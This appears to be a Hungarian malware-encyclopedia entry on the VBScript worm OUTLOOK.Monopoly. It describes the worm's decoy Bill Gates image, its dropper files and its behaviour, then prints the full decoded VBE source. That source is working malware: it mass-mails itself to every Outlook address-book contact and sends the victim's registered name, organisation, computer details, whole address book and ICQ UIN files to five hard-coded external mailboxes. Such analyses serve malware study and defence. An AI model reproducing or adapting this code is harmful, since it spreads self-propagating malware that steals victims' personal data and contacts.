Fereg neve: OUTLOOK.Monopoly
Keszito: Zulu
Eredet: Argentina
Forditas: worm

Outlookot hasznalo VBScript fereg, mely informaciokat kuld arrol, aki a filet futtatja.
Letrehozza a "MONOPOLY.JPG"-t a temporary mappaban. Ha a gepen van VBScript 5 (vagy annal ujabb),
a "MONOPOLY.WSH" es "MONOPOLY.VBE" fileokat is elhelyezi ugyanitt. Ezutan kiirja: "Bill Gates is
guilty of monopoly. Here is the proof.", valamint megmutatja a kepet, melyen Bill Gates arca
lathato egy Monopoly jatekban. Ezutan, ha talalt VBScript 5 vagy kesobbi verziot, lefuttatja a
WSH filet, ami pedig a VBE (kodolt VBScript) filet inditja el. A WSH filera azert van szukseg,
mert Windows 98-on a VBE kiterjesztes tamogatott, ha feltelepitettuk az Internet Explorer 5-ot,
de nincs tarsitva, ezert kell ez a parancsikon. A VBS file mindossze ennyit csinal, a fereg
legnagyobb resze a VBE-ben van. Ez megprobalja elkuldeni magat az Outlook cimjegyzekenek osszes
elemere. A level targya "joke", maga az uzenet pedig "Bill Gates is guilty of monopoly. Here is
the proof. :-)". Ezenkivul mailt kuld mas cimekre is, amely tartalmazza a tulajdonos nevet,
ceget, orszagat, nyelvet, ICQ UIN-filejait, az osszes nevet es cimet a cimjegyzekbol, az Internet
Explorer kezdolapjat es nehany egyeb adatot.
A VBE kod megnezi, letezik-e a registryben a "HKEY_LOCAL_MACHINE\Software\OUTLOOK.Monopoly\". Ha
igen, nem csinal semmit, ha viszont nem, akkor az Outlook hasznalata utan letrehozza.
A file-iro funkciot, ami binaris fileok DEBUG.EXE nelkuli irasara keszult, nagyon egyszeru
string-titkositaskent is hasznalja.
Az Outlook-hoz hasznalt kodreszlet a MIRC/NETWORK/OUTLOOK/PIRCH.Cucu (AKA VBS.Freelinks) feregbol
szarmazik.

1.1 es 1.2 verzio kozti valtozasok:

- Kisebb valtozas a binaris file-iro funkcioban.

1.0 es 1.1 verzio kozti valtozasok:

- Jobb funkcio binaris fileok irasara, igy csokkent a file merete.

Az osszes verzio kodolatlan VBE resze:

On Error Resume Next
Set A1 = CreateObject("WScript.Shell")
A2 = A1.RegRead("HKEY_LOCAL_MACHINE\Software\OUTLOOK.Monopoly\")
If A2 <> "True" Then
Set A3 = CreateObject("Outlook.Application")
Set A4 = A3.GetNameSpace("MAPI")
For Each A5 In A4.AddressLists
If A5.AddressEntries.Count <> 0 Then
Set A6 = A3.CreateItem(0)
For A7 = 1 To A5.AddressEntries.Count
Set A8 = A5.AddressEntries(A7)
If A7 = 1 Then
A6.BCC = A8.Address
Else
A6.BCC = A6.BCC & "; " & A8.Address
End If
Next
A6.Subject = "Bill Gates joke"
A6.Body = "Bill Gates is guilty of monopoly. Here is the proof. :-)"
Set A9 = CreateObject("Scripting.FileSystemObject")
A6.Attachments.Add A9.BuildPath(A9.GetSpecialFolder(2),"MONOPOLY.VBS")
A6.DeleteAfterSubmit = True
A6.Send
End If
Next
Set A10 = A3.CreateItem(0)
A10.BCC = "monopoly@mixmail.com; monpooly@telebot.com; mooponly@ciudad.com.ar; mloponoy@usa.net; yloponom@gnwmail.com"
A11 = A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
A10.Subject = "OUTLOOK.Monopoly coming from """ & A11 & """"
A12 = "- Information" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Time: """
A12 = A12 & Time
A12 = A12 & """" & Chr(13) & Chr(10) & "Date: """
A12 = A12 & Date
A12 = A12 & """" & Chr(13) & Chr(10) & "Name: """ & A11 & """" & Chr(13) & Chr(10) & "Organization: """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
A12 = A12 & """" & Chr(13) & Chr(10) & "Network computer name: """
Set A13 = Createobject("WScript.Network")
A12 = A12 & A13.ComputerName
A12 = A12 & """" & Chr(13) & Chr(10) & "DVD region: """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\DVD_Region")
A12 = A12 & """" & Chr(13) & Chr(10) & "Country code (first location): """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Telephony\Locations\Location0\Country")
A12 = A12 & """" & Chr(13) & Chr(10) & "Area code (first location): """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Telephony\Locations\Location0\AreaCode")
A12 = A12 & """" & Chr(13) & Chr(10) & "Language: """
A12 = A12 & A1.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
A12 = A12 & """" & Chr(13) & Chr(10) & "Windows version: """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version")
A12 = A12 & """" & Chr(13) & Chr(10) & "Windows version number: """
A12 = A12 & A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
A12 = A12 & """" & Chr(13) & Chr(10) & "Internet Explorer start page: """
A12 = A12 & A1.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
A12 = A12 & """"
A14 = "- Address book" & Chr(13) & Chr(10)
For Each A5 In A4.AddressLists
If A5.AddressEntries.Count <> 0 Then
For A7 = 1 To A5.AddressEntries.Count
Set A8 = A5.AddressEntries(A7)
A14 = A14 & Chr(13) & Chr(10) & "Name: """ & A8.Name & """, address: """ & A8.Address & """"
Next
End If
Next
A10.Body = A12 & Chr(13) & Chr(10) & Chr(13) & Chr(10) & A14
A15 = A1.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If A9.FolderExists(A9.BuildPath(A15,"ICQ\UIN")) = True Then
For Each A16 In A9.GetFolder(A9.BuildPath(A15,"ICQ\UIN")).Files
If UCase(A9.GetExtensionName(A16.Name)) = "UIN" Then
A10.Attachments.Add A16.Path
End If
Next
End If
A10.DeleteAfterSubmit = True
A10.Send
A1.RegWrite "HKEY_LOCAL_MACHINE\Software\OUTLOOK.Monopoly\","True"
End If
